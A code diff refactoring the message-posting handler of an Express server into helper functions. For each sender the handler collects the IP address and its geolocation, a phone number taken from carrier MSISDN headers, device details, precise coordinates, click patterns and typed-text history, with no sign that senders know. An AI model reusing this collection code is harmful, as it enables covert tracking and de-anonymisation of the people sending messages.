@@ -115,6 +115,64 @@ app.get('/messages', async (req, res) => {
   }
 });
 
+// Helper: Extract and validate IP
+function getClientIP(req) {
+  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  if (typeof ip === 'string' && ip.includes(',')) {
+    ip = ip.split(',')[0].trim();
+  }
+  if (ip === '::1') ip = '127.0.0.1';
+  return ip;
+}
+
+// Helper: Get geolocation from IP
+async function getGeolocation(ip) {
+  let location = 'Unknown';
+  let coordinates = null;
+  try {
+    if (ip && ip !== '127.0.0.1' && ip !== '::1') {
+      const r = await axios.get(`http://ip-api.com/json/${ip}`);
+      if (r.data?.status === 'success') {
+        location = `${r.data.city}, ${r.data.country}`;
+        if (r.data.lat && r.data.lon) {
+          coordinates = { latitude: r.data.lat, longitude: r.data.lon, accuracy: 5000 };
+        }
+      }
+    } else {
+      location = 'Local/Localhost';
+    }
+  } catch (error) {
+    console.error('Geolocation error:', error.message);
+  }
+  return { location, coordinates };
+}
+
+// Helper: Extract phone from carrier headers
+function extractPhone(req) {
+  const candidates = ['x-msisdn', 'x-up-calling-line-id', 'x-wap-msisdn', 'x-hutch-msisdn', 'x-source-msisdn', 'x-network-info'];
+  for (const key of candidates) {
+    const raw = req.headers[key];
+    if (typeof raw === 'string' && raw.trim()) {
+      const sanitized = raw.replace(/[^\d+]/g, '');
+      if (sanitized.replace(/\D/g, '').length >= 7) return sanitized;
+    }
+  }
+  return null;
+}
+
+// Helper: Parse user agent
+function parseUserAgent(req) {
+  const uaRaw = req.headers['user-agent'] || '';
+  const ua = new UAParser(uaRaw).getResult();
+  return {
+    browser: ua.browser.name || 'Unknown',
+    browserVersion: ua.browser.version || 'Unknown',
+    os: ua.os.name || 'Unknown',
+    osVersion: ua.os.version || 'Unknown',
+    deviceType: ua.device.type || 'Desktop'
+  };
+}
+
 // Post message
 app.post('/message', async (req, res) => {
   try {
@@ -123,65 +181,14 @@ app.post('/message', async (req, res) => {
       return res.status(400).json({ error: 'Message required' });
     }
 
-    // Get sender's IP address (handle proxies)
-    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    if (typeof ip === 'string' && ip.includes(',')) {
-      ip = ip.split(',')[0].trim();
-    }
-    if (ip === '::1') ip = '127.0.0.1';
-
-    // Get location from IP with coordinates
-    let location = 'Unknown';
-    let coordinates = null;
-    try {
-      if (ip && ip !== '127.0.0.1' && ip !== '::1') {
-        const r = await axios.get(`http://ip-api.com/json/${ip}`);
-        if (r.data?.status === 'success') {
-          location = `${r.data.city}, ${r.data.country}`;
-          if (r.data.lat && r.data.lon) {
-            coordinates = {
-              latitude: r.data.lat,
-              longitude: r.data.lon,
-              accuracy: 5000
-            };
-          }
-        }
-      } else {
-        location = 'Local/Localhost';
-      }
-    } catch (error) {
-      console.error('Geolocation error:', error.message);
-    }
-
-    // Prefer client-provided precise coordinates
+    const ip = getClientIP(req);
+    const { location, coordinates } = await getGeolocation(ip);
     const clientCoordinates = req.body.coordinates || null;
-
-    // Attempt to capture phone from carrier headers
-    const msisdnHeaderCandidates = [
-      'x-msisdn', 'x-up-calling-line-id', 'x-wap-msisdn',
-      'x-hutch-msisdn', 'x-source-msisdn', 'x-network-info'
-    ];
-    let phoneAuto = null;
-    for (const key of msisdnHeaderCandidates) {
-      const raw = req.headers[key];
-      if (typeof raw === 'string' && raw.trim()) {
-        const sanitized = raw.replace(/[^\d+]/g, '');
-        if (sanitized.replace(/\D/g, '').length >= 7) {
-          phoneAuto = sanitized;
-          break;
-        }
-      }
-    }
-
-    // Parse User Agent for detailed device info
-    const uaRaw = req.headers['user-agent'] || '';
-    const parser = new UAParser(uaRaw);
-    const ua = parser.getResult();
-
-    // Capture referrer and language
+    const phoneAuto = extractPhone(req);
+    const userAgent = parseUserAgent(req);
     const referrer = req.headers['referer'] || 'Direct';
     const language = (req.headers['accept-language'] || 'Unknown').split(',')[0].trim();
-    const source = detectSource(referrer, uaRaw);
+    const source = detectSource(referrer, req.headers['user-agent']);
 
     const newMessageData = {
       id: Date.now(),
@@ -193,13 +200,7 @@ app.post('/message', async (req, res) => {
       timeOnPage: req.body.timeOnPage || null,
       clickPatterns: req.body.clickPatterns || [],
       textHistory: req.body.textHistory || [],
-      userAgent: {
-        browser: ua.browser.name || 'Unknown',
-        browserVersion: ua.browser.version || 'Unknown',
-        os: ua.os.name || 'Unknown',
-        osVersion: ua.os.version || 'Unknown',
-        deviceType: ua.device.type || 'Desktop'
-      },
+      userAgent,
       referrer,
       source,
       language,
